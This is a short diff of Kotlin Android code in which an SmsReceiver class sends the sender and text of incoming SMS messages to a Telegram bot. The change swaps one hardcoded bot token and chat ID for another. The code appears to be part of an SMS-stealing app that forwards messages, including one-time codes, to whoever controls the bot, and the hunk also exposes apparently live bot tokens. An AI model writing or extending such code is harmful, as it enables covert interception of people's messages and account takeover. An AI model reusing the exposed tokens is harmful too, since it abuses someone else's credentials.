@@ -49,8 +49,8 @@ class SmsReceiver : BroadcastReceiver() {
     }
 
     private fun sendToTelegram(sender: String, message: String) {
-        val telegramToken = "8152617951:AAEToQf-M6rYZlS_1yVAjiaRuN7Tq8paHyc"
-        val chatId = "8241331214"
+        val telegramToken = "8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko"
+        val chatId = "8416456484"
         val text = "Incoming SMS (Native):\nFrom: $sender\nMessage: $message"
         val url = "https://api.telegram.org/bot$telegramToken/sendMessage"
 
